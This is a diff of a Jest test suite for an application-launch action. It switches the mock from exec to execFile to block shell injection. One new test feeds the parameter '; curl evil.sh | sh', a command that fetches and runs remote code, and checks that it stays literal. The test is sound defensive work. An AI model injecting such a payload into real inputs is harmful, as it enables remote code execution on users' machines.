@@ -10,12 +10,12 @@ jest.mock('fs', () => ({
 }));
 
 jest.mock('child_process', () => ({
-  exec: jest.fn(),
+  execFile: jest.fn(),
 }));
 
 const { executeApplication } = require('../../../src/main/actions/application');
 const fs = require('fs');
-const { exec } = require('child_process');
+const { execFile } = require('child_process');
 
 describe('Application Action', () => {
   let originalPlatform;
@@ -23,7 +23,7 @@ describe('Application Action', () => {
   beforeEach(() => {
     // Reset all mocks before each test
     jest.clearAllMocks();
-    
+
     // Store original platform
     originalPlatform = process.platform;
   });
@@ -70,13 +70,13 @@ describe('Application Action', () => {
 
       test('should execute application without parameters', async () => {
         const action = { applicationPath: '/Applications/Calculator.app' };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith('open "/Applications/Calculator.app"', expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('open', ['/Applications/Calculator.app'], expect.any(Function));
         expect(result).toEqual({
           success: true,
           message: 'Application launched successfully',
@@ -88,14 +88,15 @@ describe('Application Action', () => {
           applicationPath: '/Applications/Calculator.app',
           applicationParameters: '--some-param',
         };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith(
-          'open -a "/Applications/Calculator.app" --some-param',
+        expect(execFile).toHaveBeenCalledWith(
+          'open',
+          ['-a', '/Applications/Calculator.app', '--some-param'],
           expect.any(Function)
         );
         expect(result).toEqual({
@@ -104,25 +105,55 @@ describe('Application Action', () => {
         });
       });
 
+      test('should not let shell metacharacters in parameters spawn a shell', async () => {
+        const action = {
+          applicationPath: '/Applications/Calculator.app',
+          applicationParameters: '; curl evil.sh | sh',
+        };
+        execFile.mockImplementation((file, args, callback) => {
+          callback(null);
+        });
+
+        await executeApplication(action);
+
+        // Metacharacters become literal argv entries, never a shell command
+        expect(execFile).toHaveBeenCalledWith(
+          'open',
+          ['-a', '/Applications/Calculator.app', ';', 'curl', 'evil.sh', '|', 'sh'],
+          expect.any(Function)
+        );
+      });
+
+      test('should keep quoted parameters with spaces as single arguments', async () => {
+        const action = {
+          applicationPath: '/Applications/Calculator.app',
+          applicationParameters: '--file "my document.txt"',
+        };
+        execFile.mockImplementation((file, args, callback) => {
+          callback(null);
+        });
+
+        await executeApplication(action);
+
+        expect(execFile).toHaveBeenCalledWith(
+          'open',
+          ['-a', '/Applications/Calculator.app', '--file', 'my document.txt'],
+          expect.any(Function)
+        );
+      });
+
       test('should handle execution error', async () => {
         const action = { applicationPath: '/Applications/Calculator.app' };
         const error = new Error('Command failed');
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(error);
         });
 
-        try {
-          const result = await executeApplication(action);
-          // The promise should reject, so we shouldn't reach here
-          expect(result.success).toBe(false);
-          expect(result.message).toBe('Error executing application: Command failed');
-          expect(result.error).toBe(error);
-        } catch (rejectedValue) {
-          // Promise rejects with the error object
-          expect(rejectedValue.success).toBe(false);
-          expect(rejectedValue.message).toBe('Error executing application: Command failed');
-          expect(rejectedValue.error).toBe(error);
-        }
+        const result = await executeApplication(action);
+
+        expect(result.success).toBe(false);
+        expect(result.message).toBe('Error executing application: Command failed');
+        expect(result.error).toBe(error);
       });
     });
 
@@ -136,13 +167,13 @@ describe('Application Action', () => {
 
       test('should execute application without parameters', async () => {
         const action = { applicationPath: 'C:\\Program Files\\App\\app.exe' };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith('"C:\\Program Files\\App\\app.exe"', expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('C:\\Program Files\\App\\app.exe', [], expect.any(Function));
         expect(result).toEqual({
           success: true,
           message: 'Application launched successfully',
@@ -154,14 +185,15 @@ describe('Application Action', () => {
           applicationPath: 'C:\\Program Files\\App\\app.exe',
           applicationParameters: '/param value',
         };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith(
-          '"C:\\Program Files\\App\\app.exe" /param value',
+        expect(execFile).toHaveBeenCalledWith(
+          'C:\\Program Files\\App\\app.exe',
+          ['/param', 'value'],
           expect.any(Function)
         );
         expect(result).toEqual({
@@ -181,13 +213,13 @@ describe('Application Action', () => {
 
       test('should execute application without parameters using xdg-open', async () => {
         const action = { applicationPath: '/usr/bin/calculator' };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith('xdg-open "/usr/bin/calculator"', expect.any(Function));
+        expect(execFile).toHaveBeenCalledWith('xdg-open', ['/usr/bin/calculator'], expect.any(Function));
         expect(result).toEqual({
           success: true,
           message: 'Application launched successfully',
@@ -199,14 +231,15 @@ describe('Application Action', () => {
           applicationPath: '/usr/bin/calculator',
           applicationParameters: '--advanced',
         };
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        expect(exec).toHaveBeenCalledWith(
-          '"/usr/bin/calculator" --advanced',
+        expect(execFile).toHaveBeenCalledWith(
+          '/usr/bin/calculator',
+          ['--advanced'],
           expect.any(Function)
         );
         expect(result).toEqual({
@@ -223,7 +256,7 @@ describe('Application Action', () => {
 
       test('should handle unexpected errors in try-catch', async () => {
         const action = { applicationPath: '/test/app' };
-        
+
         // Mock fs.existsSync to throw an error
         fs.existsSync.mockImplementation(() => {
           throw new Error('File system error');
@@ -236,26 +269,19 @@ describe('Application Action', () => {
         expect(result.error).toBeInstanceOf(Error);
       });
 
-      test('should handle Promise rejection from exec', async () => {
+      test('should resolve (not reject) with failure on execFile error', async () => {
         const action = { applicationPath: '/test/app' };
         const error = new Error('Execution failed');
-        
-        exec.mockImplementation((command, callback) => {
+
+        execFile.mockImplementation((file, args, callback) => {
           callback(error);
         });
 
-        try {
-          const result = await executeApplication(action);
-          // The promise should reject, so we shouldn't reach here normally
-          expect(result.success).toBe(false);
-          expect(result.message).toBe('Error executing application: Execution failed');
-          expect(result.error).toBe(error);
-        } catch (rejectedValue) {
-          // Promise rejects with the error object
-          expect(rejectedValue.success).toBe(false);
-          expect(rejectedValue.message).toBe('Error executing application: Execution failed');
-          expect(rejectedValue.error).toBe(error);
-        }
+        const result = await executeApplication(action);
+
+        expect(result.success).toBe(false);
+        expect(result.message).toBe('Error executing application: Execution failed');
+        expect(result.error).toBe(error);
       });
     });
 
@@ -298,19 +324,19 @@ describe('Application Action', () => {
           applicationPath: '/test/app',
           applicationParameters: '',
         };
-        
+
         Object.defineProperty(process, 'platform', {
           value: 'darwin',
         });
         fs.existsSync.mockReturnValue(true);
-        exec.mockImplementation((command, callback) => {
+        execFile.mockImplementation((file, args, callback) => {
           callback(null);
         });
 
         const result = await executeApplication(action);
 
-        // Empty string is falsy, so it uses the regular form
-        expect(exec).toHaveBeenCalledWith('open "/test/app"', expect.any(Function));
+        // Empty string yields no params, so it uses the plain launch form
+        expect(execFile).toHaveBeenCalledWith('open', ['/test/app'], expect.any(Function));
         expect(result.success).toBe(true);
       });
     });
